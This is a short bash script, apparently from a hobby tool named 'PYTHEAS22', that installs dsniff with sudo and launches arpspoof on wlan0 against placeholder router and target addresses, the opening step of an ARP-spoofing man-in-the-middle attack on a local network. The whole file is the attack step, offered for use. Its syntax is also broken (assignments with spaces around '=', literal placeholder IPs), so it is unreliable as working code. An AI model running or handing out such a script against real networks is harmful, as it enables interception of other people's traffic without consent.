#!/bin/bash
echo "THANK YOU FOR USING PYTHEAS22"
echo '"router.sh" WILL BE EXECUTED IN 2 SECONDS'
spoof = $(sudo apt install dsniff)
sleep 2
arp = $(arpspoof -i wlan0 -t router_ip target_ip)
